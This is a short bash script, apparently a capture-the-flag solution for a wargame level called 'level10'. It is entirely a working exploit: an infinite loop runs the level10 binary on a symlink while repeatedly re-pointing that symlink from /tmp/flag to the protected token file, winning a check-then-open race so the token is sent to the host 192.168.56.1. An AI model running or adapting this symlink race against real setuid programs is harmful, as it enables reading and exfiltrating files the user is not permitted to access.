#!/bin/bash

while [ 1 -le 2 ]
do
        /home/user/level10/level10 /tmp/sim_link 192.168.56.1 & ln -s -f /tmp/flag /tmp/sim_link ; ln -s -f /home/user/level10/token /tmp/sim_link
done
